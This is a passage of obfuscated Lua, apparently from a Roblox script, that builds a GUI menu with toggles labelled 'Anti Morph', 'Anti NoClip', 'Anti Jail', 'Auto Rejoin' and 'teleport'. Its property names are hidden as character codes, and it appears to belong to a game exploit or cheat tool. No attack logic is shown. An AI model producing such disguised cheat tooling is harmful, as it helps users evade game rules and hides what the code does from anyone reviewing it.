_llza[_sc(51,49,98)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,49,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,49,98)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(51,49,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,49,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,49,98)][_sc(84,101,120,116)]=[[Anti Morph]];
_llza[_sc(51,49,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,49,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,49,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(51,49,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,49,98)]);
_llza[_sc(51,49,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,49,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,49,98)]);
_llza[_sc(51,49,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,49,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,49,52)]);
_llza[_sc(51,49,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,49,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(51,49,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,49,102)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=8;
_llza[_sc(51,49,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,49,102)][_sc(78,97,109,101)]=[[noclip]];
_llza[_sc(51,49,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,49,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,49,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,49,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,50,48)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,49,102)]);
_llza[_sc(51,50,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,50,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,50,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,50,48)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,50,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,50,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,50,48)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(51,50,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,50,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,50,48)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,50,49)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,50,48)]);
_llza[_sc(51,50,49)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,50,49)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,50,49)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,50,49)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,50,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,50,48)]);
_llza[_sc(51,50,50)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,50,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,50,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,50,50)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(51,50,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,50,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,50,50)]);
_llza[_sc(51,50,51)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,50,51)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,50,52)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,50,50)]);
_llza[_sc(51,50,52)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,50,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,50,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,50,52)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(51,50,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,50,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,50,53)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,50,52)]);
_llza[_sc(51,50,53)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,50,53)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,50,54)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,49,102)]);
_llza[_sc(51,50,54)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,50,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,50,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,50,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,50,54)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,50,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,50,54)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(51,50,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,50,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,50,54)][_sc(84,101,120,116)]=[[Anti NoClip]];
_llza[_sc(51,50,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,50,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,50,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(51,50,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,50,54)]);
_llza[_sc(51,50,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,50,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,50,54)]);
_llza[_sc(51,50,56)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,50,57)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,49,102)]);
_llza[_sc(51,50,57)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,50,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(51,50,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 10);
_llza[_sc(51,50,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=6;
_llza[_sc(51,50,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,50,97)][_sc(78,97,109,101)]=[[---DIVIDER---]];
_llza[_sc(51,50,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,50,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,50,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,50,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,50,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,50,97)]);
_llza[_sc(51,50,98)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,50,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,50,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,50,98)][_sc(78,97,109,101)]=[[dividerFrame]];
_llza[_sc(51,50,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,50,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,50,98)]);
_llza[_sc(51,50,99)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,50,99)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,50,100)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,50,98)]);
_llza[_sc(51,50,100)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,50,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,50,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,50,100)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(51,50,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,50,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,50,101)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,50,100)]);
_llza[_sc(51,50,101)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,50,101)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,50,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,50,98)]);
_llza[_sc(51,50,102)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,51,48)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(51,50,98)]);
_llza[_sc(51,51,49)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,50,97)]);
_llza[_sc(51,51,49)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,51,49)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,51,49)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 6);
_llza[_sc(51,51,49)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(51,51,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(51,51,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,51,50)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(51,51,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,51,50)][_sc(78,97,109,101)]=[[autoresetLABEL]];
_llza[_sc(51,51,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,51,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,51,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(51,51,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,51,51)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,51,50)]);
_llza[_sc(51,51,51)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,51,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,51,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,51,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,51,51)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,51,51)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(51,51,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,51,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,51,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,51,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,51,51)][_sc(84,101,120,116)]=[[Auto Reset]];
_llza[_sc(51,51,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,51,51)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(51,51,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,51,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,51,51)]);
_llza[_sc(51,51,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(51,51,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,51,51)]);
_llza[_sc(51,51,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,51,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(51,51,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,51,54)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=6;
_llza[_sc(51,51,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,51,54)][_sc(78,97,109,101)]=[[autorejoinLABEL]];
_llza[_sc(51,51,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,51,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,51,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(51,51,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,51,55)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,51,54)]);
_llza[_sc(51,51,55)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,51,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,51,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,51,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,51,55)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,51,55)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(51,51,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,51,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,51,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,51,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,51,55)][_sc(84,101,120,116)]=[[Auto Rejoin]];
_llza[_sc(51,51,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,51,55)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(51,51,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,51,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,51,55)]);
_llza[_sc(51,51,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(51,51,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,51,55)]);
_llza[_sc(51,51,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,51,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(51,51,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,51,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(51,51,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,51,97)][_sc(78,97,109,101)]=[[jail]];
_llza[_sc(51,51,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,51,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,51,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,51,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,51,98)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,51,97)]);
_llza[_sc(51,51,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,51,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,51,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,51,98)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,51,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,51,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,51,98)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(51,51,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,51,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,51,98)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,51,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,51,98)]);
_llza[_sc(51,51,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,51,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,51,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,51,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,51,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,51,98)]);
_llza[_sc(51,51,100)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,51,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,51,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,51,100)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(51,51,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,51,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,51,100)]);
_llza[_sc(51,51,101)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,51,101)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,51,102)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,51,100)]);
_llza[_sc(51,51,102)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,51,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,51,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,51,102)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(51,51,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,51,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,52,48)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,51,102)]);
_llza[_sc(51,52,48)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,52,48)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,52,49)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,51,97)]);
_llza[_sc(51,52,49)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,52,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,52,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,52,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,52,49)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,52,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,52,49)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(51,52,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,52,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,52,49)][_sc(84,101,120,116)]=[[Anti Jail]];
_llza[_sc(51,52,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,52,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,52,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(51,52,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,52,49)]);
_llza[_sc(51,52,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,52,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,52,49)]);
_llza[_sc(51,52,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,52,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,51,97)]);
_llza[_sc(51,52,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,52,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(51,52,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,52,53)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(51,52,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,52,53)][_sc(78,97,109,101)]=[[teleport]];
_llza[_sc(51,52,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,52,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,52,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,52,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,52,54)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,52,53)]);
_llza[_sc(51,52,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,52,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,52,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,52,54)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,52,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,52,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,52,54)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(51,52,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,52,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,52,54)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,52,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,52,54)]);
_llza[_sc(51,52,55)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,52,55)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,52,55)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,52,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,52,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,52,54)]);
_llza[_sc(51,52,56)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,52,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,52,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,52,56)][_sc(78,97,109,101)]=[[toggleFrame]];
